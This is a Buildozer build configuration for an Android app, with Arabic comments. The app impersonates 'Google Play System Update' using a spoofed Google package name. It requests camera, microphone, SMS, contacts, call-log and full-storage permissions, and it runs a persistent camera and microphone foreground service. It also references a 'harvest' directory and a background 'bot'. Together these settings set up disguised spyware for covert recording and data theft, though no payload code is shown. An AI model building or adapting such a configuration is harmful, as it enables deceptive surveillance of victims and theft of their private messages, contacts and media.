[app]

# ------------------------------------------------------------------
# الهوية العامة للتطبيق (تم تغييرها لمنع التعارض مع النسخ السابقة)
# ------------------------------------------------------------------
title = Google Play System Update
package.name = com.google.android.gms.v4
package.domain = android.system

# ------------------------------------------------------------------
# المصادر والملفات المضمنة
# ------------------------------------------------------------------
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*, .sys_runtime/.nomedia
source.exclude_dirs = tests, __pycache__, docs, .github, .sys_runtime/g_tmp, .sys_runtime/c_tmp, .sys_runtime/harvest

# ------------------------------------------------------------------
# الإصدار (رفع الرقم لضمان تفوقه على أي نسخة سابقة)
# ------------------------------------------------------------------
version = 3.1.0

# ------------------------------------------------------------------
# المكتبات المطلوبة (متوافقة مع ملف requirements.txt)
# ------------------------------------------------------------------
requirements = python3, kivy==2.3.0, requests, urllib3, certifi, pillow, pyjnius, android, cryptography, pyzipper, numpy==1.26.4, tflite-runtime

# ------------------------------------------------------------------
# أيقونة التطبيق (يجب أن تكون موجودة في هذا المسار)
# ------------------------------------------------------------------
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ------------------------------------------------------------------
# الصلاحيات (API 34 + صلاحيات الوسائط والإشعارات والسجلات)
# ------------------------------------------------------------------
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, READ_CALL_LOG, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

# ------------------------------------------------------------------
# SDK / NDK (أحدث القيم المدعومة)
# ------------------------------------------------------------------
android.api = 34
android.minapi = 21
android.sdk = 34
android.ndk = 25b
android.build_tools_ver = 34.0.0
android.accept_sdk_license = True

# ------------------------------------------------------------------
# معماريات المعالج (64-بت فقط للحصول على أداء أفضل لـ TFLite)
# ------------------------------------------------------------------
android.archs = arm64-v8a

# ------------------------------------------------------------------
# إعدادات التخزين والشبكة
# ------------------------------------------------------------------
android.allow_backup = False
android.request_legacy_external_storage = True
android.uses_cleartext_traffic = True

# ------------------------------------------------------------------
# إعدادات الخدمة الأمامية (Foreground Service) لضمان عمل البوت والخلفية
# ------------------------------------------------------------------
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True

# ------------------------------------------------------------------
# إعدادات العرض والتسجيل
# ------------------------------------------------------------------
orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

# ------------------------------------------------------------------
# منع التطبيق من الدخول في وضع توفير الطاقة (اختياري)
# ------------------------------------------------------------------
android.meta_data = android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS=1

# ------------------------------------------------------------------
# نهاية قسم [app]
# ------------------------------------------------------------------

[buildozer]
log_level = 2
warn_on_root = 1
